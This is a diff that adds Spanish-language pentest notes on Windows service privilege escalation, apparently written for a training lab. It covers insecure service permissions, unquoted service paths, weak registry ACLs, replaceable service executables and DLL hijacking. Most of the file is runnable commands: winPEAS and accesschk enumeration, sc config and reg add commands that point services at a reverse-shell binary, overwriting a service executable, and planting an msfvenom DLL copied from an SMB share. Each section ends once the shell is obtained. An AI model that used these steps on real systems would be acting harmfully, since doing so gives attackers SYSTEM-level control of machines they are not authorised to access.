@@ -1,0 +1,114 @@
+
+1.- Insecure Service Properties
+
+	Buscar por servicios con SYSTEM Privilegios
+
+	> ./winPEASany.exe quiet servicesinfo	
+		
+		Fijarse en:
+		---> -non Microsoft- 
+		---> -Modifiable Services-
+
+	Procedimiento por servicio:
+	> .\accesschk.exe /accepteula -uwcqv <usuario> daclsvc
+	> sc qc <servicio> daclsvc
+	> sc query daclsvc
+	> sc config daclsvc binpath="\"C:\Temp\reverse.exe\""
+	> net start daclsvc
+
+	Recibimos la Shell
+
+		- SERVICE_STOP, SERVICE_START
+	
+		- SERVIVE_CHANGE_CONFIG, SERVICE_ALL_ACCESS
+
+		-Rabbit Hole Potencial si puedes cambiar un servicio pero no puedes encenderlo/pararlo
+
+
+2.- Unquoted Service Path
+
+	Se Produce porque hay espacios en la ruta en los que tenemos posibilidad de RW o W y meter nuestro .exe para que lo llame antes, o en vez del propio servicio.
+
+	Considerar la siguiente ruta de un Unquothed Path:
+	-> C:\Program Files\Some Dir\someprogram.exe
+
+	> ./winPEASany.exe quiet servicesinfo.txt
+	Nos fijamos en la parte de Unquothed Services:
+	> .\accesschk.exe /accepteula -uwcqv <usuario> unquotedsvc
+	Chequeo Para ver que permisos tenemos en las Rutas donde esta el servicio
+	> .\accesschk.exe /accepteula -uwdq "C:\"
+	> .\accesschk.exe /accepteula -uwdq "C:\Program Files\"
+	> .\accesschk.exe /accepteula -uwdq "C:\Pragram Files\Unquoted Path Service\"
+		Fijarse en:
+		RW BUILTING/users
+		
+	Procedemos a Copiar Nuestra REV.shell y renombrarlo como Common.exe
+	> copy rev.exe "C:\Program Files\Unquoted Path Services\Common.exe
+	> net start <service> <- unquotedsvc
+
+	Recicibimos la Shell
+
+3.- Weak Registry Permissions
+	
+	ACLs, si estan misconfigurados puede ser posible modificar la configuracion de un servicio, sin llegar a modificar el servicio directamente.
+
+	Fijandonos en la Parte de Modificar servicio registry en el output de winPeas.exe
+
+	PowerShell:
+	> Get-Acl HKLM:\System\CurrentControlSet\Services\regsvc | Format-List
+
+	cmd:
+	> .\accesschk.exe /accepteula -uvwqk HKLM:\System\CurrentControlSet\Services\regsvc 
+
+	FIJARSE EN QUE TIENE "RW" EN NT AUTHORITY\INTERACTIVE tiene KEY_ALL_ACCESS --> SUDO GROUP --> Podemos conectarnos como admin
+	
+	Antes de nada Verificamos si podemos Arrancar/Parar el servicio
+	> .\accesschk.exe /accepteula -uwcqv <usuario> regsvc
+
+	>  reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc
+	Nos Fijamos en la ImagePath --> Seteada en un .exe que vamos a modificar
+
+	Fijarnos tambien si ObjectName = LocalSystem
+	> reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Users\admin\Desktop\tools\slo.exe /f
+
+	Volvemos a comprobar si hemos cambiado bien el binPath del servicio
+	> reg query HKLM\SYSTEM\CurrentControlSet\services\regsvc
+
+	Una vez Comprobado procedemos a arrancar el servicio
+	> net start regsvc
+	
+	Recibimos la Shell
+
+4.- Insecure Service Executables
+	
+	Sustituimos nuestra rev.shelll por el programa y le ponemos el mismo nombre
+	Intersting Services -non Microsoft- --> Winpeas.exe (output - parte)
+	Fijarse en File Permissions: Everyone 
+
+	> .\accesschk.exe /accepteula -uvqc filepermsvc
+	> copy "C:\Privesc\reverse.exe" "C:\Program Files\File Permissions Service\filepermservice.exe"
+	Una vez sustituido procedemos a arrancar el servicio
+
+
+
+5.- DLL Hijacking
+
+	Consiste en que tenemos permisos de escritura en donde windows busca una archivo .dll por lo que se puede hacer un hijacking
+
+	Fijarse en output winPEAS.exe --> Chequing write permissions in Path Folders ( DLL Hijacking )
+
+	Fijarse en cuales de estos servicios tenemos la posibilidad de arrancar/parar 
+
+	>.\accesschk.exe /accepteula -uvqc dllsvc
+
+	>sc qc dllsvc
+
+	> usamos Procmon64.exe para ver donde se esta llamando al archivo dll	
+	Hay que buscar en los servicios que salgan en winpeas como dll hijack y abajo el servicio
+	creamos un archivo dll con msfvenom
+	Lo metemos en la ruta que nos ha indicado el procmon.que tenemos permisos de escritura y lo renombramos con el nombre del servicio
+
+	> copy \\IP\smbFolder\hijackme.dll C:\Temp
+	Paramos e Iniciamos el servicio
+	Conseguimos la Shell
+
